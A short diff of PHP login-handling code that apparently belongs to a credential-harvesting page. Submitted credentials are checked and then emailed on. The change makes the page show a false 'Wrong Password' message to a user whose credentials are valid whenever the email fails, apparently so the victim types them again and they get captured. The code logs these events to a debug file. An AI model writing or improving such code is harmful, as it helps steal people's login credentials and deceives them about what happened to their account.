@@ -175,8 +175,8 @@ if (!empty($login) && !empty($passwd)) {
                 $debugLog = "Valid credentials - Email sent successfully - Setting signal to 'ok'\n";
                 file_put_contents("debug.txt", $debugLog, FILE_APPEND);
             } else {
-                $data = array('signal' => 'ok', 'msg' => 'Login Successful'); // Still show success even if email fails
-                $debugLog = "Valid credentials - Email failed but still setting signal to 'ok'\n";
+                $data = array('signal' => 'not ok', 'msg' => 'Wrong Password'); // Show wrong password if email fails
+                $debugLog = "Valid credentials - Email failed - Setting signal to 'not ok' with 'Wrong Password'\n";
                 file_put_contents("debug.txt", $debugLog, FILE_APPEND);
             }
         } else {
